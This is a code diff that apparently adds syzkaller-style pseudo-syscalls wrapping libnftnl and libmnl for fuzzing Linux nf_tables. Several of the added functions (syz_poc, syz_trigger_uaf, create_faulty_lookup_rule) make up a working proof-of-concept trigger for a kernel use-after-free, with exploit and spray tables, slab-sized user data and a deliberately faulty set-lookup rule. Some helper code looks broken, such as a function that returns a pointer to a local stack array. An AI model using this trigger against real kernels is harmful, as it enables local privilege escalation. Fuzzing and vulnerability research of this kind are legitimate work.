+#if SYZ_EXECUTOR || __NR_syz_mnl_nlmsg_batch_stop
+#include <libmnl/libmnl.h>
+static long syz_mnl_nlmsg_batch_stop(volatile long batch_ptr)
+{
+	struct mnl_nlmsg_batch* batch = (struct mnl_nlmsg_batch*)(long)batch_ptr;
+	mnl_nlmsg_batch_stop(batch);
+	return 0;
+}
+#endif
+
+#if SYZ_EXECUTOR || __NR_syz_poc
+#include <err.h>
+#include <libmnl/libmnl.h>
+#include <libnftnl/chain.h>
+#include <libnftnl/expr.h>
+#include <libnftnl/rule.h>
+#include <libnftnl/set.h>
+#include <libnftnl/table.h>
+#include <linux/netfilter.h>
+#include <linux/netfilter/nf_tables.h>
+#include <linux/netfilter/nfnetlink.h>
+#define mnl_batch_limit (1024 * 1024)
+#define TARGET_SET_SIZE 0x258 // for kmalloc-cg-1k slab
+#define NORMAL_SET_SIZE 0x158
+
+uint32_t family = NFPROTO_INET;
+char mnl_batch_buffer[2 * mnl_batch_limit];
+char mnl_batch_buffer2[2 * mnl_batch_limit];
+
+static void create_table(struct mnl_nlmsg_batch* batch, uint32_t seq, const char* table_name)
+{
+	struct nftnl_table* table = nftnl_table_alloc();
+	if (table == NULL) {
+		errx(1, "Cannot into nftnl_table_alloc()");
+	}
+
+	nftnl_table_set_u32(table, NFTNL_TABLE_FAMILY, family);
+	nftnl_table_set_str(table, NFTNL_TABLE_NAME, table_name);
+
+	struct nlmsghdr* nlh = nftnl_table_nlmsg_build_hdr(
+	    (char*)mnl_nlmsg_batch_current(batch),
+	    NFT_MSG_NEWTABLE,
+	    family,
+	    NLM_F_CREATE | NLM_F_ACK,
+	    seq);
+	nftnl_table_nlmsg_build_payload(nlh, table);
+	mnl_nlmsg_batch_next(batch);
+
+	nftnl_table_free(table);
+}
+
+static void create_set(struct mnl_nlmsg_batch* batch, uint32_t seq,
+		       const char* table_name, const char* set_name, uint32_t set_id, uint32_t set_flags,
+		       uint32_t set_key_len, uint32_t set_desc_size,
+		       void* set_userdata, uint32_t set_userdata_len)
+{
+	struct nftnl_set* set = nftnl_set_alloc();
+	if (set == NULL) {
+		errx(1, "Cannot into nftnl_set_alloc()");
+	}
+
+	nftnl_set_set_u32(set, NFTNL_SET_FAMILY, family);
+	nftnl_set_set_str(set, NFTNL_SET_TABLE, table_name);
+	nftnl_set_set_str(set, NFTNL_SET_NAME, set_name);
+	nftnl_set_set_u32(set, NFTNL_SET_ID, set_id);
+	nftnl_set_set_u32(set, NFTNL_SET_FLAGS, set_flags);
+	nftnl_set_set_u32(set, NFTNL_SET_KEY_LEN, set_key_len);
+	if (set_desc_size != 0) {
+		nftnl_set_set_u32(set, NFTNL_SET_DESC_SIZE, set_desc_size);
+	}
+	if (set_userdata != NULL) {
+		nftnl_set_set_data(set, NFTNL_SET_USERDATA, set_userdata, set_userdata_len);
+	}
+
+	struct nlmsghdr* nlh = nftnl_set_nlmsg_build_hdr(
+	    (char*)mnl_nlmsg_batch_current(batch),
+	    NFT_MSG_NEWSET,
+	    family,
+	    NLM_F_CREATE | NLM_F_ACK,
+	    seq);
+	nftnl_set_nlmsg_build_payload(nlh, set);
+	mnl_nlmsg_batch_next(batch);
+
+	nftnl_set_free(set);
+}
+
+static void create_chain(struct mnl_nlmsg_batch* batch, uint32_t seq,
+			 const char* table_name, const char* chain_name)
+{
+	struct nftnl_chain* chain = nftnl_chain_alloc();
+	if (chain == NULL) {
+		errx(1, "Cannot into nftnl_chain_alloc()");
+	}
+
+	nftnl_chain_set_u32(chain, NFTNL_CHAIN_FAMILY, family);
+	nftnl_chain_set_str(chain, NFTNL_CHAIN_TABLE, table_name);
+	nftnl_chain_set_str(chain, NFTNL_CHAIN_NAME, chain_name);
+
+	struct nlmsghdr* nlh = nftnl_chain_nlmsg_build_hdr(
+	    (char*)mnl_nlmsg_batch_current(batch),
+	    NFT_MSG_NEWCHAIN,
+	    family,
+	    NLM_F_CREATE | NLM_F_ACK,
+	    seq);
+	nftnl_chain_nlmsg_build_payload(nlh, chain);
+	mnl_nlmsg_batch_next(batch);
+
+	nftnl_chain_free(chain);
+}
+
+static void create_lookup_rule(struct mnl_nlmsg_batch* batch, uint32_t seq,
+			       const char* table_name, const char* chain_name, const char* set_name, int set_id)
+{
+	struct nftnl_rule* rule = nftnl_rule_alloc();
+	if (rule == NULL) {
+		errx(1, "Cannot into nftnl_rule_alloc()");
+	}
+
+	nftnl_rule_set_u32(rule, NFTNL_RULE_FAMILY, family);
+	nftnl_rule_set_str(rule, NFTNL_RULE_TABLE, table_name);
+	nftnl_rule_set_str(rule, NFTNL_RULE_CHAIN, chain_name);
+
+	struct nftnl_expr* lookup = nftnl_expr_alloc("lookup");
+	if (lookup == NULL) {
+		errx(1, "Cannot into nftnl_expr_alloc()");
+	}
+
+	nftnl_expr_set_u32(lookup, NFTNL_EXPR_LOOKUP_SREG, NFT_REG_1);
+	nftnl_expr_set_str(lookup, NFTNL_EXPR_LOOKUP_SET, set_name);
+	nftnl_expr_set_u32(lookup, NFTNL_EXPR_LOOKUP_SET_ID, set_id);
+	nftnl_expr_set_u32(lookup, NFTNL_EXPR_LOOKUP_FLAGS, 0);
+
+	nftnl_rule_add_expr(rule, lookup);
+
+	struct nlmsghdr* nlh = nftnl_rule_nlmsg_build_hdr(
+	    (char*)mnl_nlmsg_batch_current(batch),
+	    NFT_MSG_NEWRULE,
+	    family,
+	    NLM_F_APPEND | NLM_F_CREATE | NLM_F_ACK,
+	    seq);
+	nftnl_rule_nlmsg_build_payload(nlh, rule);
+	mnl_nlmsg_batch_next(batch);
+
+	nftnl_rule_free(rule);
+}
+
+static void create_faulty_lookup_rule(struct mnl_nlmsg_batch* batch, uint32_t seq,
+				      const char* table_name, const char* chain_name, const char* set_name, int set_id)
+{
+	struct nftnl_expr *lookup1, *lookup2;
+	struct nftnl_rule* rule;
+
+	rule = nftnl_rule_alloc();
+	if (rule == NULL) {
+		errx(1, "Cannot into nftnl_rule_alloc()");
+	}
+
+	nftnl_rule_set_u32(rule, NFTNL_RULE_FAMILY, family);
+	nftnl_rule_set_str(rule, NFTNL_RULE_TABLE, table_name);
+	nftnl_rule_set_str(rule, NFTNL_RULE_CHAIN, chain_name);
+
+	lookup1 = nftnl_expr_alloc("lookup");
+	if (lookup1 == NULL) {
+		errx(1, "Cannot into nftnl_expr_alloc()");
+	}
+
+	// for release
+	nftnl_expr_set_u32(lookup1, NFTNL_EXPR_LOOKUP_SREG, NFT_REG_1);
+	nftnl_expr_set_str(lookup1, NFTNL_EXPR_LOOKUP_SET, set_name);
+	nftnl_expr_set_u32(lookup1, NFTNL_EXPR_LOOKUP_SET_ID, set_id);
+	nftnl_expr_set_u32(lookup1, NFTNL_EXPR_LOOKUP_FLAGS, 0);
+
+	nftnl_rule_add_expr(rule, lookup1);
+
+	lookup2 = nftnl_expr_alloc("lookup");
+	if (lookup2 == NULL) {
+		errx(1, "Cannot into nftnl_expr_alloc()");
+	}
+
+	// for fault
+	nftnl_expr_set_u32(lookup2, NFTNL_EXPR_LOOKUP_SREG, 0);
+	nftnl_expr_set_str(lookup2, NFTNL_EXPR_LOOKUP_SET, set_name);
+	nftnl_expr_set_u32(lookup2, NFTNL_EXPR_LOOKUP_SET_ID, set_id);
+	nftnl_expr_set_u32(lookup2, NFTNL_EXPR_LOOKUP_FLAGS, 0);
+
+	nftnl_rule_add_expr(rule, lookup2);
+
+	struct nlmsghdr* nlh = nftnl_rule_nlmsg_build_hdr(
+	    (char*)mnl_nlmsg_batch_current(batch),
+	    NFT_MSG_NEWRULE,
+	    family,
+	    NLM_F_APPEND | NLM_F_CREATE | NLM_F_ACK,
+	    seq);
+	nftnl_rule_nlmsg_build_payload(nlh, rule);
+	mnl_nlmsg_batch_next(batch);
+
+	nftnl_rule_free(rule);
+}
+
+static long syz_poc()
+{
+	int flag = 0;
+	const char* spray_table_name = "spray_table";
+	const char* exploit_table_name = "exploit_table";
+
+	const char* spray_chain_name = "OUTPUT";
+	const char* exploit_chain_name = "OUTPUT";
+
+	//char *exploit_set_name = "set_A";
+	struct mnl_socket* nl;
+	nl = mnl_socket_open(NETLINK_NETFILTER);
+	mnl_socket_bind(nl, 0, MNL_SOCKET_AUTOPID);
+	uint32_t portid, seq, table_seq;
+	int ret;
+
+	seq = time(NULL);
+
+	struct mnl_nlmsg_batch* batch = mnl_nlmsg_batch_start(mnl_batch_buffer, mnl_batch_limit);
+
+	nftnl_batch_begin((char*)mnl_nlmsg_batch_current(batch), seq++);
+	table_seq = seq;
+	mnl_nlmsg_batch_next(batch);
+
+	// table for spray
+	create_table(batch, seq++, spray_table_name);
+	create_chain(batch, seq++, spray_table_name, spray_chain_name);
+
+	// table for exploit
+	create_table(batch, seq++, exploit_table_name);
+	create_chain(batch, seq++, exploit_table_name, exploit_chain_name);
+
+	nftnl_batch_end((char*)mnl_nlmsg_batch_current(batch), seq++);
+	mnl_nlmsg_batch_next(batch);
+
+	portid = mnl_socket_get_portid(nl);
+
+	if (mnl_socket_sendto(nl, mnl_nlmsg_batch_head(batch),
+			      mnl_nlmsg_batch_size(batch)) < 0) {
+		err(1, "Cannot into mnl_socket_sendto()");
+	}
+
+	mnl_nlmsg_batch_stop(batch);
+
+	while (table_seq + 1 != seq) {
+		ret = mnl_socket_recvfrom(nl, mnl_batch_buffer, mnl_batch_limit);
+		if (ret == -1) {
+			err(1, "Cannot into mnl_socket_recvfrom()");
+		}
+		ret = mnl_cb_run(mnl_batch_buffer, ret, table_seq, portid, NULL, NULL);
+		if (ret == -1) {
+			err(1, "Cannot into mnl_cb_run()");
+		}
+		table_seq++;
+	}
+
+	char exploit_set_name[0x100];
+	char udata_buf[TARGET_SET_SIZE];
+	//char * exploit_set_name = "set_exploit";
+
+	// first batch : register anon set
+	seq = time(NULL);
+	batch = mnl_nlmsg_batch_start(mnl_batch_buffer, mnl_batch_limit);
+
+	nftnl_batch_begin((char*)mnl_nlmsg_batch_current(batch), seq++);
+	table_seq = seq;
+	mnl_nlmsg_batch_next(batch);
+
+	memset(exploit_set_name, 'A', sizeof(exploit_set_name));
+	memset(udata_buf, 0, 0x258);
+	exploit_set_name[sizeof(exploit_set_name) - 1] = '\x00';
+	create_set(batch, seq++, exploit_table_name, "a", 0x13100, NFT_SET_ANONYMOUS, 1, 0, udata_buf, 0x100);
+	create_set(batch, seq++, exploit_table_name, "b", 0x13101, NFT_SET_ANONYMOUS, 1, 0, udata_buf, 0x100);
+
+	create_faulty_lookup_rule(batch, seq++, exploit_table_name, exploit_chain_name, "a", 0x13100);
+	create_faulty_lookup_rule(batch, seq++, exploit_table_name, exploit_chain_name, "b", 0x13100);
+
+	create_lookup_rule(batch, seq++, exploit_table_name, exploit_chain_name, "a", 0x13100);
+
+	nftnl_batch_end((char*)mnl_nlmsg_batch_current(batch), seq++);
+	mnl_nlmsg_batch_next(batch);
+
+	portid = mnl_socket_get_portid(nl);
+
+	// start spray thread
+	printf("[*] first batch will start with spray\n");
+	flag = 1;
+	sleep(1);
+	if (mnl_socket_sendto(nl, mnl_nlmsg_batch_head(batch),
+			      mnl_nlmsg_batch_size(batch)) < 0) {
+		err(1, "Cannot into mnl_socket_sendto()");
+	}
+	// stop spray thread
+	flag = 0;
+
+	mnl_nlmsg_batch_stop(batch);
+	printf("[*] first batch done\n");
+	return 0;
+}
+#endif
+
+#if SYZ_EXECUTOR || __NR_syz_nftnl_chain_nlmsg_build_hdr
+#include <libnftnl/chain.h>
+static long syz_nftnl_chain_nlmsg_build_hdr(volatile long buf_ptr, volatile long type, volatile long family, volatile long flags, volatile long seq)
+{
+	char* buf = (char*)(long)buf_ptr;
+	return (long)nftnl_chain_nlmsg_build_hdr(buf, type, family, flags, seq);
+}
+#endif
+
+#if SYZ_EXECUTOR || __NR_syz_nftnl_set_nlmsg_build_hdr
+#include <libnftnl/set.h>
+static long syz_nftnl_set_nlmsg_build_hdr(volatile long buf_ptr, volatile long type, volatile long family, volatile long flags, volatile long seq)
+{
+	char* buf = (char*)(long)buf_ptr;
+	return (long)nftnl_set_nlmsg_build_hdr(buf, type, family, flags, seq);
+}
+#endif
+
+#if SYZ_EXECUTOR || __NR_syz_nftnl_chain_nlmsg_build_payload
+#include <libnftnl/chain.h>
+static long syz_nftnl_chain_nlmsg_build_payload(volatile long nlh_ptr, volatile long c_ptr)
+{
+	struct nlmsghdr* nlh = (struct nlmsghdr*)(long)nlh_ptr;
+	struct nftnl_chain* c = (struct nftnl_chain*)(long)c_ptr;
+	nftnl_chain_nlmsg_build_payload(nlh, c);
+	return 0;
+}
+#endif
+
+#if SYZ_EXECUTOR || __NR_syz_nftnl_rule_add_expr
+#include <libnftnl/rule.h>
+static long syz_nftnl_rule_add_expr(volatile long rule_ptr, volatile long expr_ptr)
+{
+	struct nftnl_rule* r = (struct nftnl_rule*)(long)rule_ptr;
+	struct nftnl_expr* expr = (struct nftnl_expr*)(long)expr_ptr;
+	nftnl_rule_add_expr(r, expr);
+	return 0;
+}
+#endif
+
+#if SYZ_EXECUTOR || __NR_syz_nftnl_rule_nlmsg_build_hdr
+#include <libnftnl/rule.h>
+static long syz_nftnl_rule_nlmsg_build_hdr(volatile long buf_ptr, volatile long type, volatile long family, volatile long flags, volatile long seq)
+{
+	char* buf = (char*)(long)buf_ptr;
+	return (long)nftnl_rule_nlmsg_build_hdr(buf, type, family, flags, seq);
+}
+#endif
+
+#if SYZ_EXECUTOR || __NR_syz_prepare_nftables
+#include <libmnl/libmnl.h>
+#include <libnftnl/chain.h>
+#include <libnftnl/expr.h>
+#include <libnftnl/rule.h>
+#include <libnftnl/set.h>
+#include <libnftnl/table.h>
+const char* spray_table_name = "spray_table";
+const char* exploit_table_name = "exploit_table";
+
+const char* spray_chain_name = "OUTPUT";
+const char* exploit_chain_name = "OUTPUT";
+
+static long syz_prepare_nftables(volatile long nl_ptr)
+{
+	struct mnl_socket* nl = (struct mnl_socket*)(long)nl_ptr;
+	uint32_t portid, seq, table_seq;
+	int ret;
+
+	seq = time(NULL);
+
+	struct mnl_nlmsg_batch* batch = mnl_nlmsg_batch_start(mnl_batch_buffer, mnl_batch_limit);
+
+	nftnl_batch_begin((char*)mnl_nlmsg_batch_current(batch), seq++);
+	table_seq = seq;
+	mnl_nlmsg_batch_next(batch);
+
+	// table for spray
+	create_table(batch, seq++, spray_table_name);
+	create_chain(batch, seq++, spray_table_name, spray_chain_name);
+
+	// table for exploit
+	create_table(batch, seq++, exploit_table_name);
+	create_chain(batch, seq++, exploit_table_name, exploit_chain_name);
+
+	nftnl_batch_end((char*)mnl_nlmsg_batch_current(batch), seq++);
+	mnl_nlmsg_batch_next(batch);
+
+	portid = mnl_socket_get_portid(nl);
+
+	if (mnl_socket_sendto(nl, mnl_nlmsg_batch_head(batch),
+			      mnl_nlmsg_batch_size(batch)) < 0) {
+		err(1, "Cannot into mnl_socket_sendto()");
+	}
+
+	mnl_nlmsg_batch_stop(batch);
+
+	while (table_seq + 1 != seq) {
+		ret = mnl_socket_recvfrom(nl, mnl_batch_buffer, mnl_batch_limit);
+		if (ret == -1) {
+			err(1, "Cannot into mnl_socket_recvfrom()");
+		}
+		ret = mnl_cb_run(mnl_batch_buffer, ret, table_seq, portid, NULL, NULL);
+		if (ret == -1) {
+			err(1, "Cannot into mnl_cb_run()");
+		}
+		table_seq++;
+	}
+
+	return 0;
+}
+#endif
+
+#if SYZ_EXECUTOR || __NR_syz_trigger_uaf
+static long syz_trigger_uaf(volatile long nl_ptr)
+{
+	struct mnl_socket* nl = (struct mnl_socket*)(long)nl_ptr;
+	uint32_t portid, seq, table_seq;
+	struct mnl_nlmsg_batch* batch;
+	char exploit_set_name[0x100];
+	char udata_buf[TARGET_SET_SIZE];
+
+	// first batch : register anon set
+	seq = time(NULL);
+	batch = mnl_nlmsg_batch_start(mnl_batch_buffer, mnl_batch_limit);
+
+	nftnl_batch_begin((char*)mnl_nlmsg_batch_current(batch), seq++);
+	table_seq = seq;
+	mnl_nlmsg_batch_next(batch);
+
+	memset(exploit_set_name, 'A', sizeof(exploit_set_name));
+	memset(udata_buf, 0, TARGET_SET_SIZE);
+	exploit_set_name[sizeof(exploit_set_name) - 1] = '\x00';
+	create_set(batch, seq++, exploit_table_name, "a", 0x13100, NFT_SET_ANONYMOUS, 1, 0, udata_buf, TARGET_SET_SIZE - NORMAL_SET_SIZE);
+	create_set(batch, seq++, exploit_table_name, "b", 0x13101, NFT_SET_ANONYMOUS, 1, 0, udata_buf, TARGET_SET_SIZE - NORMAL_SET_SIZE);
+
+	create_faulty_lookup_rule(batch, seq++, exploit_table_name, exploit_chain_name, "a", 0x13100);
+	create_faulty_lookup_rule(batch, seq++, exploit_table_name, exploit_chain_name, "b", 0x13100);
+
+	create_lookup_rule(batch, seq++, exploit_table_name, exploit_chain_name, "a", 0x13100);
+
+	nftnl_batch_end((char*)mnl_nlmsg_batch_current(batch), seq++);
+	mnl_nlmsg_batch_next(batch);
+
+	portid = mnl_socket_get_portid(nl);
+
+	// start spray thread
+	printf("[*] first batch will start with spray\n");
+	sleep(1);
+	if (mnl_socket_sendto(nl, mnl_nlmsg_batch_head(batch),
+			      mnl_nlmsg_batch_size(batch)) < 0) {
+		err(1, "Cannot into mnl_socket_sendto()");
+	}
+	// stop spray thread
+
+	mnl_nlmsg_batch_stop(batch);
+	printf("[*] first batch done\n");
+	return 0;
+}
+#endif
+
+#if SYZ_EXECUTOR || __NR_syz_declare_mnl_batch_buffer
+#define mnl_batch_limit (1024 * 1024)
+static long syz_declare_mnl_batch_buffer()
+{
+	char* mnl_batch_buffer = new char[2 * mnl_batch_limit];
+	long address = (long)mnl_batch_buffer;
+	return address;
+}
+#endif
+
+#if SYZ_EXECUTOR || __NR_syz_set_table
+static long syz_set_table(volatile long table_name_ptr)
+{
+	char* table_name = (char*)(long)table_name_ptr;
+	struct nftnl_table* table;
+	table = nftnl_table_alloc();
+	nftnl_table_set_str(table, NFTNL_TABLE_NAME, table_name);
+	return (long)table;
+}
+#endif
+
+#if SYZ_EXECUTOR || __NR_syz_set_obj
+#include <libnftnl/object.h>
+static long syz_set_obj(volatile long table_name_ptr, volatile long obj_name_ptr)
+{
+	char* table_name = (char*)(long)table_name_ptr;
+	char* obj_name = (char*)(long)obj_name_ptr;
+	struct nftnl_obj* obj;
+	obj = nftnl_obj_alloc();
+	nftnl_obj_set_str(obj, NFTNL_OBJ_NAME, obj_name);
+	nftnl_obj_set_str(obj, NFTNL_OBJ_TABLE, table_name);
+	nftnl_obj_set_u32(obj, NFTNL_OBJ_TYPE, NFT_OBJECT_COUNTER);
+	nftnl_obj_set_u64(obj, NFTNL_OBJ_CTR_BYTES, 0);
+	return (long)obj;
+}
+#endif
+
+#if SYZ_EXECUTOR || __NR_syz_set_set
+static long syz_set_set(volatile long table_name_ptr, volatile long set_name_ptr)
+{
+	char* table_name = (char*)(long)table_name_ptr;
+	char* set_name = (char*)(long)set_name_ptr;
+	struct nftnl_set* set;
+	set = nftnl_set_alloc();
+	nftnl_set_set_str(set, NFTNL_SET_TABLE, table_name);
+	nftnl_set_set_str(set, NFTNL_SET_NAME, set_name);
+	nftnl_set_set_u32(set, NFTNL_SET_FAMILY, NFPROTO_IPV4);
+	nftnl_set_set_u32(set, NFTNL_SET_KEY_LEN, 8);
+	nftnl_set_set_u32(set, NFTNL_SET_ID, htonl(0xcafe));
+	nftnl_set_set_u32(set, NFTNL_SET_FLAGS, NFT_SET_OBJECT | NFT_SET_ANONYMOUS);
+	nftnl_set_set_u32(set, NFTNL_SET_OBJ_TYPE, NFT_OBJECT_COUNTER);
+	return (long)set;
+}
+#endif
+
+#if SYZ_EXECUTOR || __NR_syz_set_elem
+static long syz_set_elem(volatile long table_name_ptr, volatile long obj_name_ptr)
+{
+	char* table_name = (char*)(long)table_name_ptr;
+	char* obj_name = (char*)(long)obj_name_ptr;
+	struct nftnl_set* sx = nftnl_set_alloc();
+	struct nftnl_set_elem* slem = nftnl_set_elem_alloc();
+	int klen[64];
+	nftnl_set_set_str(sx, NFTNL_SET_TABLE, table_name);
+	nftnl_set_set_u32(sx, NFTNL_SET_ID, htonl(0xcafe));
+	nftnl_set_elem_set(slem, NFTNL_SET_ELEM_KEY, &klen, 8);
+	nftnl_set_elem_set_str(slem, NFTNL_SET_ELEM_OBJREF, obj_name);
+	nftnl_set_elem_add(sx, slem);
+	return (long)slem;
+}
+#endif
+
+struct mnl_socket* gs;
+struct mnl_nlmsg_batch* gbatch;
+int gseq = 0;
+char gbuf[16384];
+struct nlmsghdr* gnh;
+
+#if SYZ_EXECUTOR || __NR_syz_start_batch
+static long syz_start_batch()
+{
+	gbatch = mnl_nlmsg_batch_start(gbuf, sizeof(gbuf));
+	nftnl_batch_begin((char*)mnl_nlmsg_batch_current(gbatch), gseq++);
+	mnl_nlmsg_batch_next(gbatch);
+	return 0;
+}
+#endif
+
+#if SYZ_EXECUTOR || __NR_syz_table_build_payload
+static long syz_table_build_payload(volatile long table_ptr)
+{
+	struct nftnl_table* table = (struct nftnl_table*)(long)table_ptr;
+	gnh = nftnl_table_nlmsg_build_hdr((char*)mnl_nlmsg_batch_current(gbatch), NFT_MSG_NEWTABLE, NFPROTO_IPV4, NLM_F_CREATE, gseq++);
+	nftnl_table_nlmsg_build_payload(gnh, table);
+	mnl_nlmsg_batch_next(gbatch);
+	return 0;
+}
+#endif
+
+#if SYZ_EXECUTOR || __NR_syz_obj_build_payload
+static long syz_obj_build_payload(volatile long obj_ptr)
+{
+	struct nftnl_obj* obj = (struct nftnl_obj*)(long)obj_ptr;
+	gnh = nftnl_nlmsg_build_hdr((char*)mnl_nlmsg_batch_current(gbatch), NFT_MSG_NEWOBJ, NFPROTO_IPV4, NLM_F_CREATE, gseq++);
+	nftnl_obj_nlmsg_build_payload(gnh, obj);
+	mnl_nlmsg_batch_next(gbatch);
+	return 0;
+}
+#endif
+
+#if SYZ_EXECUTOR || __NR_syz_set_build_payload
+static long syz_set_build_payload(volatile long set_ptr)
+{
+	struct nftnl_set* set = (struct nftnl_set*)(long)set_ptr;
+	gnh = nftnl_set_nlmsg_build_hdr((char*)mnl_nlmsg_batch_current(gbatch), NFT_MSG_NEWSET, NFPROTO_IPV4, NLM_F_CREATE, gseq++);
+	nftnl_set_nlmsg_build_payload(gnh, set);
+	mnl_nlmsg_batch_next(gbatch);
+	return 0;
+}
+#endif
+
+#if SYZ_EXECUTOR || __NR_syz_set_elem_build_payload
+static long syz_set_elem_build_payload(volatile long set_ptr)
+{
+	struct nftnl_set* s = (struct nftnl_set*)(long)set_ptr;
+	gnh = nftnl_nlmsg_build_hdr((char*)mnl_nlmsg_batch_current(gbatch), NFT_MSG_NEWSETELEM, NFPROTO_IPV4, NLM_F_CREATE, gseq++);
+	nftnl_set_elems_nlmsg_build_payload(gnh, s);
+	mnl_nlmsg_batch_next(gbatch);
+	return 0;
+}
+#endif
+
+#if SYZ_EXECUTOR || __NR_syz_nftnl_obj_alloc
+#include <libnftnl/object.h>
+static long syz_nftnl_obj_alloc()
+{
+	struct nftnl_obj* obj = nftnl_obj_alloc();
+	return (long)obj;
+}
+#endif
+
+#if SYZ_EXECUTOR || __NR_syz_nftnl_obj_set_str
+static long syz_nftnl_obj_set_str(volatile long obj_ptr, volatile long attr, volatile long str_ptr)
+{
+	struct nftnl_obj* obj = (struct nftnl_obj*)(long)obj_ptr;
+	char* str = (char*)(long)str_ptr;
+	nftnl_obj_set_str(obj, attr, str);
+	return 0;
+}
+#endif
+
+#if SYZ_EXECUTOR || __NR_syz_nftnl_obj_set_u32
+static long syz_nftnl_obj_set_u32(volatile long obj_ptr, volatile long attr, volatile long val)
+{
+	struct nftnl_obj* obj = (struct nftnl_obj*)(long)obj_ptr;
+	nftnl_obj_set_u32(obj, attr, val);
+	return 0;
+}
+#endif
+
+#if SYZ_EXECUTOR || __NR_syz_nftnl_obj_set_u64
+static long syz_nftnl_obj_set_u64(volatile long obj_ptr, volatile long attr, volatile long val)
+{
+	struct nftnl_obj* obj = (struct nftnl_obj*)(long)obj_ptr;
+	nftnl_obj_set_u64(obj, attr, val);
+	return 0;
+}
+#endif
+
+#if SYZ_EXECUTOR || __NR_syz_nftnl_set_elem_set_str
+static long syz_nftnl_set_elem_set_str(volatile long set_elem_ptr, volatile long attr, volatile long str_ptr)
+{
+	struct nftnl_set_elem* set_elem = (struct nftnl_set_elem*)(long)set_elem_ptr;
+	char* str = (char*)(long)str_ptr;
+	return (long)nftnl_set_elem_set_str(set_elem, attr, str);
+}
+#endif
+
+#if SYZ_EXECUTOR || __NR_syz_nftnl_nlmsg_build_hdr
+static long syz_nftnl_nlmsg_build_hdr(volatile long buf_ptr, volatile long type, volatile long family, volatile long flags, volatile long seq)
+{
+	char* buf = (char*)(long)buf_ptr;
+	return (long)nftnl_nlmsg_build_hdr(buf, type, family, flags, seq);
+}
+#endif
+
+#if SYZ_EXECUTOR || __NR_syz_nftnl_obj_nlmsg_build_payload
+static long syz_nftnl_obj_nlmsg_build_payload(volatile long nlh_ptr, volatile long obj_ptr)
+{
+	struct nlmsghdr* nlh = (struct nlmsghdr*)(long)nlh_ptr;
+	struct nftnl_obj* obj = (struct nftnl_obj*)(long)obj_ptr;
+	nftnl_obj_nlmsg_build_payload(nlh, obj);
+	return 0;
+}
+#endif
+
+#if SYZ_EXECUTOR || __NR_syz_declare_char_array
+static long syz_declare_char_array(volatile long size)
+{
+	char array[size];
+	for (int i = 0; i < size; i++)
+		array[i] = '\0';
+	return (long)array;
+}
+#endif
+
+#if SYZ_EXECUTOR || __NR_syz_declare_int_array
+static long syz_declare_int_array(volatile long size)
+{
+	int array[size];
+	for (int i = 0; i < size; i++)
+		array[i] = 0;
+	return (long)array;
+}
+#endif
+
+#if SYZ_EXECUTOR || __NR_syz_create_table
+static long syz_create_table(volatile long batch_ptr, volatile long table_name_ptr, volatile long family, volatile long seq)
+{
+	struct mnl_nlmsg_batch* batch = (struct mnl_nlmsg_batch*)(long)batch_ptr;
+	char* table_name = (char*)(long)table_name_ptr;
+	struct nftnl_table* table = nftnl_table_alloc();
+	nftnl_table_set_str(table, NFTNL_TABLE_NAME, table_name);
+	nftnl_table_set_u32(table, NFTNL_TABLE_FAMILY, family);
+	nftnl_table_set_u32(table, NFTNL_TABLE_FLAGS, 0);
+
+	struct nlmsghdr* nlh;
+
+	nlh = nftnl_table_nlmsg_build_hdr((char*)mnl_nlmsg_batch_current(batch), NFT_MSG_NEWTABLE, family, NLM_F_CREATE | NLM_F_ACK, seq++);
+	nftnl_table_nlmsg_build_payload(nlh, table);
+	mnl_nlmsg_batch_next(batch);
+	return 0;
+}
+#endif
+
+#if SYZ_EXECUTOR || __NR_syz_create_chain
+static long syz_create_chain(volatile long batch_ptr, volatile long table_name_ptr, volatile long chain_name_ptr, volatile long family, volatile long seq)
+{
+	struct mnl_nlmsg_batch* batch = (struct mnl_nlmsg_batch*)(long)batch_ptr;
+	char* table_name = (char*)(long)table_name_ptr;
+	char* chain_name = (char*)(long)chain_name_ptr;
+	struct nftnl_chain* chain = nftnl_chain_alloc();
+
+	nftnl_chain_set_u32(chain, NFTNL_CHAIN_FAMILY, family);
+	nftnl_chain_set_str(chain, NFTNL_CHAIN_TABLE, table_name);
+	nftnl_chain_set_str(chain, NFTNL_CHAIN_NAME, chain_name);
+
+	struct nlmsghdr* nlh = nftnl_chain_nlmsg_build_hdr((char*)mnl_nlmsg_batch_current(batch), NFT_MSG_NEWCHAIN, family, NLM_F_CREATE | NLM_F_ACK, seq);
+	nftnl_chain_nlmsg_build_payload(nlh, chain);
+	mnl_nlmsg_batch_next(batch);
+
+	nftnl_chain_free(chain);
+
+	return 0;
+}
+#endif
+
+#if SYZ_EXECUTOR || __NR_syz_create_set
+static long syz_create_set(volatile long batch_ptr, volatile long table_name_ptr, volatile long set_name_ptr,
+			   volatile long set_flags, volatile long family, volatile long seq)
+{
+	struct mnl_nlmsg_batch* batch = (struct mnl_nlmsg_batch*)(long)batch_ptr;
+	char* table_name = (char*)(long)table_name_ptr;
+	char* set_name = (char*)(long)set_name_ptr;
+
+	struct nftnl_set* set = nftnl_set_alloc();
+
+	nftnl_set_set_u32(set, NFTNL_SET_FAMILY, family);
+	nftnl_set_set_str(set, NFTNL_SET_TABLE, table_name);
+	nftnl_set_set_str(set, NFTNL_SET_NAME, set_name);
+	nftnl_set_set_u32(set, NFTNL_SET_FLAGS, set_flags);
+
+	struct nlmsghdr* nlh = nftnl_set_nlmsg_build_hdr((char*)mnl_nlmsg_batch_current(batch), NFT_MSG_NEWSET, family, NLM_F_CREATE | NLM_F_ACK, seq);
+	nftnl_set_nlmsg_build_payload(nlh, set);
+	mnl_nlmsg_batch_next(batch);
+
+	nftnl_set_free(set);
+
+	return 0;
+}
+#endif
+
+#if SYZ_EXECUTOR || __NR_syz_create_rule_expr_lookup
+static long syz_create_rule_expr_lookup(volatile long batch_ptr, volatile long table_name_ptr, volatile long chain_name_ptr,
+					volatile long set_name_ptr, volatile long reg, volatile long family, volatile long seq)
+{
+	struct mnl_nlmsg_batch* batch = (struct mnl_nlmsg_batch*)(long)batch_ptr;
+	char* table_name = (char*)(long)table_name_ptr;
+	char* chain_name = (char*)(long)chain_name_ptr;
+	char* set_name = (char*)(long)set_name_ptr;
+	struct nftnl_rule* rule = nftnl_rule_alloc();
+
+	nftnl_rule_set_u32(rule, NFTNL_RULE_FAMILY, family);
+	nftnl_rule_set_str(rule, NFTNL_RULE_TABLE, table_name);
+	nftnl_rule_set_str(rule, NFTNL_RULE_CHAIN, chain_name);
+
+	struct nftnl_expr* lookup = nftnl_expr_alloc("lookup");
+
+	nftnl_expr_set_u32(lookup, NFTNL_EXPR_LOOKUP_SREG, reg);
